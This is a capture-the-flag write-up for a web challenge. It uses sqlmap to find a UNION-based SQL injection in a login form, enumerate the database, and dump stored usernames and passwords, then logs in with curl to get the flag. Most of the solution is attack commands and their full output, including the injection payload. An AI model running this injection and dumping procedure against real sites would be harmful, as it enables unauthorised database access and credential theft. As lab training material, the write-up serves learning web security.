# Not Another SQLi Challenge
Web, 100 points

## Description:

A link to a website was provided.

```html
<html>
	<head>
    <title>Central Authentication Service RC1.2</title>
	</head>

	<body bgcolor="#800000">
			<h1 style="color:white">Howdy!</h1>
			<img align = "right" src = "/images/logo.png" width="50%">

		<div>
			<form action = "/web/login.php" method = "POST">
		   		<p align="left" style="color:white">
			NetID: <br>
			<input type = "text" name = "username" align = "justify"/><br><br>
		   		Password: <br>
			<input type = "password" name = "password" align = "justify"/><br>
			</p>
		   		<input type = "submit" value="Login" />
			</form>
		</div>
	</body>
</html>
```

## Solution:

The website had a login form.

Since the title mentions SQLi, we'll start with SQLMap:

```console
root@kali:~# sqlmap -u http://web1.tamuctf.com/web/login.php  --method POST --data "username=1&password=1" -p "username"
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.5#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 21:37:54

[21:37:54] [INFO] testing connection to the target URL
[21:38:00] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[21:38:00] [INFO] testing if the target URL content is stable
[21:38:01] [INFO] target URL content is stable
[21:38:03] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[21:38:06] [INFO] testing for SQL injection on POST parameter 'username'
[21:38:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:38:12] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[21:38:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[21:38:19] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[21:38:22] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[21:38:26] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[21:38:28] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[21:38:29] [INFO] testing 'MySQL inline queries'
[21:38:29] [INFO] testing 'PostgreSQL inline queries'
[21:38:29] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[21:38:30] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[21:38:30] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[21:38:33] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[21:38:35] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[21:38:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[21:38:41] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[21:38:45] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[21:38:47] [INFO] testing 'Oracle AND time-based blind'
[21:38:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[21:39:17] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[21:39:20] [INFO] target URL appears to have 2 columns in query
[21:39:20] [WARNING] applying generic concatenation (CONCAT)
[21:39:23] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[21:39:23] [INFO] checking if the injection point on POST parameter 'username' is a false positive

sqlmap identified the following injection point(s) with a total of 144 HTTP(s) requests:
---
Parameter: username (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: username=1' UNION ALL SELECT CONCAT(CONCAT('qkzxq','UdjfxTdKSgvbPGmoNajAofyVtpCyNYetlOLRCTKT'),'qkxvq'),NULL-- lvOs&password=1
---
[21:43:38] [INFO] testing MySQL
[21:43:39] [INFO] confirming MySQL
[21:43:40] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.0
[21:43:40] [INFO] fetched data logged to text files under '/root/.sqlmap/output/web1.tamuctf.com'

[*] shutting down at 21:43:40

root@kali:~# sqlmap -u http://web1.tamuctf.com/web/login.php  --method POST --data "username=1&password=1" -p "username" --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.5#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 21:44:21

[21:44:21] [INFO] resuming back-end DBMS 'mysql'
[21:44:21] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: username=1' UNION ALL SELECT CONCAT(CONCAT('qkzxq','UdjfxTdKSgvbPGmoNajAofyVtpCyNYetlOLRCTKT'),'qkxvq'),NULL-- lvOs&password=1
---
[21:44:25] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL 5
[21:44:25] [INFO] fetching database names
[21:44:25] [INFO] used SQL query returns 2 entries
[21:44:25] [INFO] retrieved: information_schema
[21:44:26] [INFO] retrieved: SqliDB
available databases [2]:
[*] information_schema
[*] SqliDB

[21:44:26] [INFO] fetched data logged to text files under '/root/.sqlmap/output/web1.tamuctf.com'

[*] shutting down at 21:44:26

root@kali:~# sqlmap -u http://web1.tamuctf.com/web/login.php  --method POST --data "username=1&password=1" -p "username" --tables -D SqliDB
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.5#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 21:44:54

[21:44:54] [INFO] resuming back-end DBMS 'mysql'
[21:44:54] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: username=1' UNION ALL SELECT CONCAT(CONCAT('qkzxq','UdjfxTdKSgvbPGmoNajAofyVtpCyNYetlOLRCTKT'),'qkxvq'),NULL-- lvOs&password=1
---
[21:45:00] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL 5
[21:45:00] [INFO] fetching tables for database: 'SqliDB'
[21:45:01] [INFO] used SQL query returns 1 entries
Database: SqliDB
[1 table]
+-------+
| login |
+-------+

[21:45:01] [INFO] fetched data logged to text files under '/root/.sqlmap/output/web1.tamuctf.com'

[*] shutting down at 21:45:01

root@kali:~# sqlmap -u http://web1.tamuctf.com/web/login.php  --method POST --data "username=1&password=1" -p "username" --columns -D SqliDB -T login
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.5#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 21:46:25

[21:46:25] [INFO] resuming back-end DBMS 'mysql'
[21:46:26] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: username=1' UNION ALL SELECT CONCAT(CONCAT('qkzxq','UdjfxTdKSgvbPGmoNajAofyVtpCyNYetlOLRCTKT'),'qkxvq'),NULL-- lvOs&password=1
---
[21:46:26] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL 5
[21:46:26] [INFO] fetching columns for table 'login' in database 'SqliDB'
[21:46:27] [INFO] used SQL query returns 2 entries
[21:46:27] [INFO] retrieved: "User","varchar(20)"
[21:46:28] [INFO] retrieved: "Password","varchar(100)"
Database: SqliDB
Table: login
[2 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| User     | varchar(20)  |
| Password | varchar(100) |
+----------+--------------+

[21:46:28] [INFO] fetched data logged to text files under '/root/.sqlmap/output/web1.tamuctf.com'

[*] shutting down at 21:46:28

root@kali:~# sqlmap -u http://web1.tamuctf.com/web/login.php  --method POST --data "username=1&password=1" -p "username" --dump -D SqliDB -T login
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.5#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 21:46:49

[21:46:49] [INFO] resuming back-end DBMS 'mysql'
[21:46:54] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: username=1' UNION ALL SELECT CONCAT(CONCAT('qkzxq','UdjfxTdKSgvbPGmoNajAofyVtpCyNYetlOLRCTKT'),'qkxvq'),NULL-- lvOs&password=1
---
[21:46:55] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL 5
[21:46:55] [INFO] fetching columns for table 'login' in database 'SqliDB'
[21:46:55] [INFO] used SQL query returns 2 entries
[21:46:55] [INFO] resumed: "User","varchar(20)"
[21:46:55] [INFO] resumed: "Password","varchar(100)"
[21:46:55] [INFO] fetching entries for table 'login' in database 'SqliDB'
[21:46:56] [INFO] used SQL query returns 2 entries
[21:46:57] [INFO] retrieved: "tS&LjHue6Z&m*&JeTU#U%btyA8gmJXh","admin"
[21:46:58] [INFO] retrieved: "password","bobsagget"
Database: SqliDB
Table: login
[2 entries]
+-----------+---------------------------------+
| User      | Password                        |
+-----------+---------------------------------+
| admin     | tS&LjHue6Z&m*&JeTU#U%btyA8gmJXh |
| bobsagget | password                        |
+-----------+---------------------------------+

[21:46:58] [INFO] table 'SqliDB.login' dumped to CSV file '/root/.sqlmap/output/web1.tamuctf.com/dump/SqliDB/login.csv'
[21:46:58] [INFO] fetched data logged to text files under '/root/.sqlmap/output/web1.tamuctf.com'

[*] shutting down at 21:46:58
```

Got the password, let's use it to log in:
```console
root@kali:~# curl -d "username=admin" --data-urlencode "password=tS&LjHue6Z&m*&JeTU#U%btyA8gmJXh" -X POST http://web1.tamuctf.com/web/login.php
<html>gigem{f4rm3r5_f4rm3r5_w3'r3_4ll_r16h7}!</html>
```